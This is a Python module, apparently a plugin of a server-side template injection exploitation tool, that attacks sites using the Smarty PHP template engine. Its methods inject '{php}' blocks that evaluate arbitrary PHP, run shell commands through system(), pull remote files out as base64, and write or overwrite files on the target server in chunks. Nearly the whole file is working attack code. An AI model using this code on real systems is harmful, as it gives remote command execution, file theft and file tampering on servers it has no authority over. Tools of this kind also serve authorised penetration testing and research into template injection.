from utils.strings import quote, chunkit, base64encode, base64decode, md5
from core.check import Check
from utils.loggers import log
from utils import rand
from utils.strings import quote

class Smarty(Check):

    render_tag = '{%(payload)s}'
    header_tag = '{%(header)s}'
    trailer_tag = '{%(trailer)s}'
    contexts = [
        { 'level': 1, 'prefix': '}', 'suffix' : '${' },
    ]

    def detect_engine(self):

        randA = rand.randstr_n(1)
        randB = rand.randstr_n(1)

        payload = '%s{*%s*}%s' % (randA, rand.randstr_n(1), randB)
        expected = randA + randB

        if expected == self.inject(payload):
            self.set('language', 'php')
            self.set('engine', 'smarty')

    def detect_eval(self):

        expected_rand = str(rand.randint_n(1))
        payload = """print('%s');""" % expected_rand

        result_php_tag = self.evaluate(payload)

        # If {php} is sent back means is in secure mode
        if expected_rand == result_php_tag:
            self.set('eval', 'php')
            self.set('os', self.evaluate('echo PHP_OS;'))


    def evaluate(self, code):
        return self.inject('{php}%s{/php}' % (code))

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        return self.evaluate("""system("%s");""" % (quote(command)))



    def detect_read(self):
        self.set('read', True)

    def _md5(self, remote_path):
        return self.evaluate("""is_file("%s") && print(md5_file("%s"));""" % (remote_path, remote_path))
        
    def read(self, remote_path):
                
        # Get remote file md5
        md5_remote = self._md5(remote_path)
            
        if not md5_remote:
            log.warn('Error getting remote file md5, check presence and permission')
            return
        
        data_b64encoded = self.evaluate("""print(base64_encode(file_get_contents("%s")));""" %  remote_path)
        data = base64decode(data_b64encoded)

        if not md5(data) == md5_remote:
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.info('File downloaded correctly')
            
        return data
        
    def detect_write(self):
        self.set('write', True)
        
    def write(self, data, remote_path):
        
        # Check existance and overwrite with --force-overwrite
        if self._md5(remote_path):
            if not self.channel.args.get('force_overwrite'):
                log.warn('Remote path already exists, use --force-overwrite for overwrite')
                return
            else:
                self.evaluate("""file_put_contents("%s", "");""" % (remote_path))

        # Upload file in chunks of 500 characters
        for chunk in chunkit(data, 500):

            chunk_b64 = base64encode(chunk)
            self.evaluate("""file_put_contents("%s", base64_decode("%s"), FILE_APPEND);""" % (remote_path, chunk_b64))

        if not md5(data) == self._md5(remote_path):
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.warn('File uploaded correctly')